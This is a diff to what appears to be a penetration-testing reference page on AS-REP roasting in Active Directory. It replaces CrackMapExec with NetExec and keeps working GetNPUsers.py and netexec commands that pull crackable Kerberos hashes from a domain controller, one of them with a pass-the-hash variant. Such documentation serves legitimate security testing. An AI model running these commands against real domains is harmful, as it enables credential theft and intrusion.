@@ -34,10 +34,10 @@ GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $K
 GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
 ```
 
-This can also be achieved with [CrackMapExec](https://github.com/mpgn/CrackMapExec) (Python).
+This can also be achieved with [NetExec](https://github.com/Pennyw0rth/NetExec) (Python).
 
 ```bash
-crackmapexec ldap $TARGETS -u $USER -p $PASSWORD --asreproast ASREProastables.txt --KdcHost $KeyDistributionCenter
+netexec ldap $TARGETS -u $USER -p $PASSWORD --asreproast ASREProastables.txt --KdcHost $KeyDistributionCenter
 ```
 
 The [kerberoast](https://github.com/skelsec/kerberoast) pure-python toolkit is a good alternative to the tools mentioned above.
